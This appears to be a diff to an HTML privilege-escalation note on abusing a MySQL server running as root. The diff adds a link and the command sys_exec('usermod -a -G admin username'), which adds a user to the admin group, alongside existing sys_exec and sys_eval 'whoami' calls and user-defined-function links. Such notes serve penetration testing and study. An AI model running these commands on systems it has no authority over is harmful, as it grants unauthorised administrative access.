@@ -20,4 +20,8 @@ If you find that mysql is running as root and you username and password to log i
 select sys_exec('whoami');<br/>
 select sys_eval('whoami');<br/>
 <br/>
-If neither of those work you can use a <a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">User Defined Function</a>/</body></html>
+If neither of those work you can use a <a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">User Defined Function</a>/<br/>
+<br/>
+<br/>
+Maybe <a href="https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/">read</a>&nbsp;about the sys_exec() function:<br/>
+sys_exec('usermod -a -G admin username')</body></html>
